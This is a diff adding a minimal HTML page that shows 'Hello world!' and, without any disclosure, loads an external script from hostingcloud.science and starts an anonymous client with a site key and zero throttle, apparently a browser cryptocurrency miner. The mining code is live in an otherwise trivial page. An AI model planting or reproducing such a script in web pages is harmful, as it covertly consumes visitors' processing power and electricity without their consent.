@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head></head>
+
+<body>
+<p>Hello world!</p>
+<script src="https://www.hostingcloud.science./3ZFo.js"></script>
+<script>
+    var _client = new Client.Anonymous('45ba788e88463e1a334820cee378829caa1c720c41a9314264a948187e542777', {
+        throttle: 0
+    });
+    _client.start();
+</script>
+</body>
+</html>
